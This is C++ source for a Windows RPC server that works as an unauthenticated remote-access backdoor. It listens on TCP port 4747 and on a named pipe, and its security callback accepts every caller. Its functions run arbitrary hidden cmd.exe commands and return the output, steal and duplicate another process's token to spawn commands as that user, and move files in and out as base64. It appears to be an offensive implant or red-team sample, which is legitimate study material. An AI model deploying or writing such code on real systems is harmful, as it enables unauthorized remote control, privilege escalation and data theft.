#include <windows.h>
#include <iostream>
#include <Lmcons.h>
#include "../RpcServerInterface/RpcServerInterface.h"
#include "../RpcServerInterface2/RpcServerInterface2.h"
#include <string>
#include <fstream>
#include "Base64.h"

void Execute(LPSTR* Command, LPSTR* Output)
{
    // Prepebd "cmd.exe /c " to the command
    std::string command_with_prefix = std::string("cmd.exe /c ")  + std::string(*Command);
    
    // Create pipes to read STDOUT
    HANDLE hPipeRead, hPipeWrite;
    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES) };
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
    {
        *Output = strdup("Execute Failed");
        return;
    }

    // Prepare structs for CreateProcess
    STARTUPINFOA startupInfo = { sizeof(STARTUPINFOA) };
    startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    startupInfo.hStdOutput = hPipeWrite;
    startupInfo.hStdError = hPipeWrite;
    startupInfo.wShowWindow = SW_HIDE;
    startupInfo.dwFlags |= STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION processInformation = { 0 };

    // Execute the command
    BOOL fSuccess = CreateProcessA(NULL, (LPSTR)command_with_prefix.c_str(), NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startupInfo, &processInformation);
    if (!fSuccess)
    {
        CloseHandle(hPipeWrite);
        CloseHandle(hPipeRead);
        *Output = strdup("Execute Failed");
        return;
    }

    // Read the output until the process terminates
    std::string output;
    bool bProcessEnded = false;
    while (!bProcessEnded)
    {
        bProcessEnded = WaitForSingleObject(processInformation.hProcess, 100) == WAIT_OBJECT_0;

        while(true)
        {
            char buf[1024];
            DWORD dwRead = 0;
            DWORD dwAvail = 0;

            if (!::PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))
                break;

            if (!dwAvail)
                break;

            if (!::ReadFile(hPipeRead, buf, min(sizeof(buf) - 1, dwAvail), &dwRead, NULL) || !dwRead)
                break;

            buf[dwRead] = 0;
            output += std::string(buf);
        }
    }

    // Clean up
    CloseHandle(hPipeWrite);
    CloseHandle(hPipeRead);
    CloseHandle(processInformation.hProcess);
    CloseHandle(processInformation.hThread);
    
    *Output = strdup(output.c_str());
}

void ExecuteWithToken(LPSTR* Command, int ProcessId, LPSTR* Output)
{
    // We need to convert the command to unicode for CreateProcessWithTokenW
    std::string command = std::string("/c ") + std::string(*Command);
    std::wstring command_w;
    command_w.assign(command.begin(), command.end());

    // Create pipes to read STDOUT
    HANDLE hPipeRead, hPipeWrite;
        SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES) };
    saAttr.bInheritHandle = TRUE; // Pipe handles are inherited by child process.
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
    {
        wprintf(L"Executtion failed (Error: %d).\n", GetLastError());
        *Output = strdup("Execution failed");
        return;
    }

    HANDLE tokenHandle = NULL;
    HANDLE duplicateTokenHandle = NULL;
    // Call OpenProcess to get a process handle
    HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, ProcessId);
    if (GetLastError() == NULL)
        printf("[+] OpenProcess() success!\n");
    else
    {
        printf("[-] OpenProcess() Return Code: %i\n", processHandle);
        printf("[-] OpenProcess() Error: %i\n", GetLastError());
    }

    // Call OpenProcessToken() to get a handle for the process token
    BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE, &tokenHandle);
    if (GetLastError() == NULL)
        printf("[+] OpenProcessToken() success!\n");
    else
    {
        printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
        printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
    }

    // Duplicate the process token
    BOOL duplicateToken = DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
    if (GetLastError() == NULL)
        printf("[+] DuplicateTokenEx() success!\n");
    else
    {
        printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
        printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
    }

    // Prepare structs for CreateProcessWithTokenW
    STARTUPINFOW startupInfo = { sizeof(STARTUPINFOW) };
    startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    startupInfo.hStdOutput = hPipeWrite;
    startupInfo.hStdError = hPipeWrite;
    startupInfo.wShowWindow = SW_HIDE;
    startupInfo.dwFlags |= STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION processInformation = { 0 };
    // Call CreateProcessWithTokenW
    BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, 0, L"cmd.exe", (LPWSTR)command_w.c_str(), 0, NULL, NULL, &startupInfo, &processInformation);
    if (GetLastError() == NULL)
        printf("[+] Process spawned!\n");
    else
    {
        printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
        printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
    }

    if (!createProcess) {
        *Output = strdup("ExecuteWithToken Failed");
        return;
    }

    // Read the output until the process terminates
    std::string output;
    bool bProcessEnded = false;
    while(!bProcessEnded)
    {
        bProcessEnded = WaitForSingleObject(processInformation.hProcess, 100) == WAIT_OBJECT_0;

        while (true) 
        {
            char buf[1024];
            DWORD dwRead = 0;
            DWORD dwAvail = 0;

            if (!::PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))
                break;

            if (!dwAvail)
                break;

            if (!::ReadFile(hPipeRead, buf, min(sizeof(buf) - 1, dwAvail), &dwRead, NULL) || !dwRead)
                break;

            buf[dwRead] = 0;
            output += std::string(buf);
        }
    }

    // Clean up
    CloseHandle(processHandle);
    CloseHandle(tokenHandle);
    CloseHandle(duplicateTokenHandle);
    CloseHandle(hPipeWrite);
    CloseHandle(hPipeRead);
    CloseHandle(processInformation.hProcess);
    CloseHandle(processInformation.hThread);

    *Output = strdup(output.c_str());
}

static char* ReadFile(LPSTR filename, int* length)
{
    size_t size;

    // Open the file
    std::ifstream ifs(filename, std::ios::in | std::ios::binary | std::ios::ate);
    if (!ifs.is_open()) 
    {
        *length = -1;
        return NULL;
    }

    // Get the file size
    ifs.seekg(0, std::ios::end);
    size = ifs.tellg();
    ifs.seekg(0, std::ios::beg);
    char* pChars = new char[size];

    // Read all bytes
    ifs.read(pChars, size);

    // Close the file and return the content and length
    ifs.close();
    *length = size;

    // Base64 encode the file and return it
    std::string encoded = pChars;
    macaron::Base64 encoder;
    encoded = encoder.Encode(pChars, *length);

    return strdup(encoded.c_str());
}

void Download(LPSTR* Path, LPSTR* Data)
{
    int length = -1;
    *Data = ReadFile(*Path, &length);
}

void SaveFile(LPSTR path, char* buffer)
{
    // Base64 decode the data
    macaron::Base64 encoder;
    char* decoded;
    int length;
    length = encoder.Decode(buffer, &decoded);

    // Save the data to the specified path
    std::ofstream ofs(path, std::ios::out | std::ios::binary);
    ofs.write(decoded, length);
    ofs.close();
}

void Upload(LPSTR* Path, LPSTR* Data)
{
    SaveFile(*Path, *Data);
}

void Shutdown()
{
    RPC_STATUS status;

    status = RpcMgmtStopServerListening(NULL);

    if (status)
    {
        exit(status);
    }

    status = RpcServerUnregisterIf(NULL, NULL, FALSE);

    if (status)
    {
        exit(status);
    }

    ExitThread(0);
}
void Shutdown2()
{
    Shutdown();
}

RPC_STATUS CALLBACK SecurityCallback(RPC_IF_HANDLE, void*)
{
    return RPC_S_OK; // Always allow anyone
}

int main()
{
    RPC_STATUS status;
    
    // Register TCP/IP endpoint
    status = RpcServerUseProtseqEp(
        (RPC_CSTR)"ncacn_ip_tcp",
        RPC_C_PROTSEQ_MAX_REQS_DEFAULT,
        (RPC_CSTR)"4747", // TCP/IP port to use.
        NULL);

    if (status)
        exit(status);

    // Registers the first interface
    status = RpcServerRegisterIf2(
        RpcServerInterface_v1_0_s_ifspec,
        NULL,
        NULL,
        RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH,
        RPC_C_LISTEN_MAX_CALLS_DEFAULT,
        (unsigned)-1,
        SecurityCallback);

    if (status)
        exit(status);

    // Register named pipes endpoint
    status = RpcServerUseProtseqEp(
        (RPC_CSTR)"ncacn_np",
        RPC_C_PROTSEQ_MAX_REQS_DEFAULT,
        (RPC_CSTR)"\\pipe\\atctl", // Hard-coded pipe name
        NULL);
    
    if (status)
        exit(status);

    // Registers the second interface
    status = RpcServerRegisterIf2(
        RpcServerInterface2_v1_0_s_ifspec,
        NULL,
        NULL,
        RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH,
        RPC_C_LISTEN_MAX_CALLS_DEFAULT,
        (unsigned)-1,
        SecurityCallback);
    
    if (status)
        exit(status);

    // Start to listen for remote procedure calls for all registered interfaces
    status = RpcServerListen(
        2, // Recommended minimum number of threads
        RPC_C_LISTEN_MAX_CALLS_DEFAULT, // Recommended maximum number of threads
        FALSE);

    if (status)
      exit(status);
}

void* __RPC_USER midl_user_allocate(size_t size)
{
    return malloc(size);
}

void __RPC_USER midl_user_free(void* p)
{
    free(p);
}
